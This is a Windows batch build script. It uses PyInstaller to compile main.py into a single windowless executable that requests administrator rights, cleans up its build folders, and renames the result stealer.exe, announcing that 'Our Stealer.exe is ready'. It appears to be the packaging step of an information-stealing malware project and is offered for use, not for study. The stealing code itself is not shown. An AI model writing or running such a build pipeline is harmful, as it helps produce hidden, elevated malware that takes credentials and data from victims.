echo Installing PyInstaller...
pip install pyinstaller

echo Starting PyInstaller...

pyinstaller --onefile --noconsole --clean --manifest=uac_admin.manifest .\main.py

echo PyInstaller Finished!
set scriptDir=%~dp0
cd /d "%scriptDir%dist"

move main.exe ..

cd ..
echo Cleaning up...

powershell -Command "Remove-Item -Path '%scriptDir%dist' -Recurse -Force"
powershell -Command "Remove-Item -Path '%scriptDir%build' -Recurse -Force"

DEL main.spec
echo Temporary files deleted!

ren main.exe stealer.exe
echo Our Stealer.exe is ready!
